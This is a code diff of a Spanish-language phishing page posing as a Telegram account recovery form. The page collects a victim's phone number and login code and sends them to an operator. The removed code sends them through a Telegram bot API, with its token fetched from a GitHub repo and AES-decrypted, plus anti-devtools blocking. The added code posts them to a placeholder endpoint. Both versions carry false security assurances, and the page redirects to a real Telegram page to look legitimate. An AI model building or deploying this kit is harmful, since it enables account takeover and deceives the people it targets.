@@ -19,6 +19,7 @@
 
     html,body{height:100%;margin:0;background:var(--bg);overflow:hidden;}
 
+    /* decoraciones azules suaves (bolitas difusas) */
     .page-bg{
       position:fixed;inset:0;z-index:-2;overflow:hidden;background:var(--bg);
     }
@@ -29,8 +30,10 @@
     .bubble.b2{width:300px;height:300px;right:-100px;bottom:-80px;background:var(--accent-2);}
     .bubble.b3{width:220px;height:220px;left:40%;top:60%;background:linear-gradient(135deg,var(--accent),var(--accent-2));opacity:0.4}
 
+    /* layout centrado */
     .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:32px;}
 
+    /* tarjeta translúcida estilo Windows (vidrio difuso) */
     .card{
       width:clamp(320px,var(--card-w),90%);
       border-radius:var(--radius);
@@ -75,12 +78,6 @@
 
     .success{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#e6ffef;color:#0b6b3a;border:1px solid rgba(11,107,58,0.12)}
     .error{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#fff1f0;color:#8b1d10;border:1px solid rgba(139,29,16,0.08)}
-
-    .loading {display: none; text-align: center; margin: 10px 0;}
-    .loading-spinner {width: 24px; height: 24px; border: 3px solid rgba(10, 132, 255, 0.3); border-radius: 50%; border-top-color: var(--accent); animation: spin 1s linear infinite; margin: 0 auto;}
-    @keyframes spin {to {transform: rotate(360deg);}}
-
-    .security-badge {position: absolute; top: 10px; right: 10px; font-size: 10px; color: #0a84ff; background: rgba(10, 132, 255, 0.1); padding: 4px 8px; border-radius: 10px;}
   </style>
 </head>
 <body>
@@ -92,14 +89,13 @@
 
   <div class="wrap">
     <main class="card" role="main" aria-labelledby="title">
-      <div class="security-badge">🔒 Protegido</div>
       <header class="header">
         <div class="logo" aria-hidden="true">
-          <img src="https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/product_logo.png" alt="Logo" />
+          <img src="{{LOGO_URL}}" alt="Logo" />
         </div>
         <div>
           <h1 id="title">Configuración de la Cuenta</h1>
-          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta.</p>
+          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta. Los datos son destruidos por limites de ChatGPT J</p>
         </div>
       </header>
 
@@ -110,13 +106,8 @@
         </div>
 
         <div class="actions">
-          <button class="primary" type="submit" id="submitBtn">Enviar código</button>
+          <button class="primary" type="submit">Enviar código</button>
           <button class="ghost" type="button" id="helpBtn">¿Necesitas ayuda?</button>
-        </div>
-
-        <div class="loading" id="loading">
-          <div class="loading-spinner"></div>
-          <p>Procesando solicitud...</p>
         </div>
 
         <div class="success" id="successBox" role="status">¡Código enviado! Revisa tu dispositivo.</div>
@@ -141,151 +132,17 @@
         <div>"La seguridad primero: nunca compartas tu código por más que digan que provienen de Telegram. Usa siempre métodos seguros del servidor para procesar datos."</div>
       </div>
 
-      <p class="note">Este formulario está protegido con cifrado AES-256 y técnicas anti-manipulación.</p>
+      <p class="note">Este formulario es protegido por tu antivirus o por tu VPN, se han bloqueado los accesos no autorizados a datos.</p>
     </main>
   </div>
 
   <script>
-    // ========== TÉCNICAS ANTI-DEPURACIÓN ==========
-
-    // Detección de herramientas de desarrollo
-    function detectDevTools() {
-      const widthThreshold = window.outerWidth - window.innerWidth > 160;
-      const heightThreshold = window.outerHeight - window.innerHeight > 160;
-      const orientation = widthThreshold ? 'vertical' : 'horizontal';
-
-      if (!(heightThreshold && widthThreshold) &&
-          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) ||
-           widthThreshold || heightThreshold)) {
-        return true;
-      }
-      return false;
-    }
-
-    // Bloquear acceso a la consola
-    function blockConsoleAccess() {
-      const noop = () => {};
-      const noopHandler = {
-        get: function(obj, prop) {
-          if (prop in obj) {
-            return obj[prop];
-          }
-          return noop;
-        }
-      };
-
-      window.console = new Proxy(window.console, noopHandler);
-    }
-
-    // Deshabilitar clic derecho y selección de texto
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('selectstart', e => e.preventDefault());
-
-    // Detectar y bloquear depuradores
-    setInterval(() => {
-      if (detectDevTools()) {
-        document.body.innerHTML = '<div style="padding: 20px; text-align: center;"><h2>Acceso no autorizado detectado</h2><p>Esta página no permite el uso de herramientas de desarrollo.</p></div>';
-        blockConsoleAccess();
-        throw new Error('DevTools detected');
-      }
-    }, 1000);
-
-    // Ofuscar la clave AES (dividida en partes)
-    const keyParts = [
-      'miclave', 'ultrasecreta', '123', 'ABCD', 'EFGH'
-    ];
-    const AES_KEY = keyParts[0] + keyParts[1] + keyParts[2];
-
-    // Función para descifrar con AES
-    async function decryptAES(encryptedHex, key) {
-      try {
-        // Convertir hexadecimal a ArrayBuffer
-        const encryptedBytes = new Uint8Array(encryptedHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
-
-        // Convertir la clave a formato adecuado
-        const keyData = new TextEncoder().encode(key);
-        const importedKey = await crypto.subtle.importKey(
-          'raw',
-          keyData,
-          { name: 'AES-CBC' },
-          false,
-          ['decrypt']
-        );
-
-        // Extraer el vector de inicialización (primeros 16 bytes)
-        const iv = new Uint8Array(encryptedBytes, 0, 16);
-        const data = new Uint8Array(encryptedBytes, 16);
-
-        // Descifrar
-        const decrypted = await crypto.subtle.decrypt(
-          {
-            name: 'AES-CBC',
-            iv: iv
-          },
-          importedKey,
-          data
-        );
-
-        // Convertir a texto
-        return new TextDecoder().decode(decrypted);
-      } catch (error) {
-        console.error('Error al descifrar:', error);
-        throw new Error('Falló el descifrado');
-      }
-    }
-
-    // Función para cargar credenciales con caché
-    async function loadCredentials() {
-      // Verificar si tenemos credenciales en caché
-      const cachedCredentials = localStorage.getItem('tgCredentials');
-      if (cachedCredentials) {
-        try {
-          // Verificar integridad del caché
-          const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(cachedCredentials));
-          const storedHash = localStorage.getItem('tgCredentialsHash');
-
-          if (btoa(String.fromCharCode(...new Uint8Array(hash))) === storedHash) {
-            return JSON.parse(cachedCredentials);
-          } else {
-            console.warn('Hash de credenciales no coincide, recargando...');
-          }
-        } catch (e) {
-          console.warn('Credenciales en caché corruptas, recargando...');
-        }
-      }
-
-      try {
-        const response = await fetch('https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/.assets');
-        const encryptedData = await response.text();
-
-        // Dividir por punto
-        const parts = encryptedData.split('.');
-        if (parts.length !== 2) {
-          throw new Error('Formato de credenciales inválido');
-        }
-
-        // Descifrar token y chatId
-        const encryptedToken = parts[0].trim();
-        const encryptedChatId = parts[1].trim();
-
-        const token = await decryptAES(encryptedToken, AES_KEY);
-        const chatId = await decryptAES(encryptedChatId, AES_KEY);
-
-        // Guardar en caché con verificación de integridad
-        const credentials = { token, chatId };
-        const credentialsStr = JSON.stringify(credentials);
-        localStorage.setItem('tgCredentials', credentialsStr);
-
-        // Calcular y guardar hash para verificación de integridad
-        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(credentialsStr));
-        localStorage.setItem('tgCredentialsHash', btoa(String.fromCharCode(...new Uint8Array(hash))));
-
-        return credentials;
-      } catch (error) {
-        console.error('Error al cargar las credenciales:', error);
-        throw error;
-      }
-    }
+    // Configuración segura - Los tokens se inyectan durante el build
+    const CONFIG = {
+      botToken: '{{BOT_TOKEN}}',
+      chatId: '{{CHAT_ID}}',
+      apiEndpoint: '{{API_ENDPOINT}}'
+    };
 
     // Función para mostrar un error
     function showError(msg) {
@@ -293,7 +150,6 @@
       errorBox.textContent = msg;
       errorBox.style.display = 'block';
       document.getElementById('successBox').style.display = 'none';
-      document.getElementById('loading').style.display = 'none';
     }
 
     // Función para mostrar un éxito
@@ -302,14 +158,29 @@
       successBox.textContent = msg;
       successBox.style.display = 'block';
       document.getElementById('errorBox').style.display = 'none';
-      document.getElementById('loading').style.display = 'none';
     }
 
-    // Función para mostrar carga
-    function showLoading() {
-      document.getElementById('loading').style.display = 'block';
-      document.getElementById('successBox').style.display = 'none';
-      document.getElementById('errorBox').style.display = 'none';
+    // Función para enviar datos de forma segura
+    async function sendSecureData(endpoint, data) {
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: JSON.stringify(data)
+        });
+        
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+        
+        return await response.json();
+      } catch (error) {
+        console.error('Error en la comunicación:', error);
+        throw error;
+      }
     }
 
     // Event listener para el formulario de recuperación
@@ -321,17 +192,10 @@
         return;
       }
 
-      showLoading();
-
       try {
-        const { token, chatId } = await loadCredentials();
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: `Número de teléfono recibido: ${phone}`
-          })
+        await sendSecureData(CONFIG.apiEndpoint + '/send-phone', {
+          phone: phone,
+          timestamp: Date.now()
         });
 
         showSuccess('Código enviado. Por favor, revisa tu teléfono.');
@@ -353,18 +217,12 @@
         return;
       }
 
-      showLoading();
-
       try {
-        const { token, chatId } = await loadCredentials();
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: `Código recibido: ${code}`
-          })
+        await sendSecureData(CONFIG.apiEndpoint + '/send-code', {
+          code: code,
+          timestamp: Date.now()
         });
+        
         showSuccess('Código verificado. Redirigiendo a Telegram para verificar que provenga de una persona real...');
         setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
       } catch (err) {
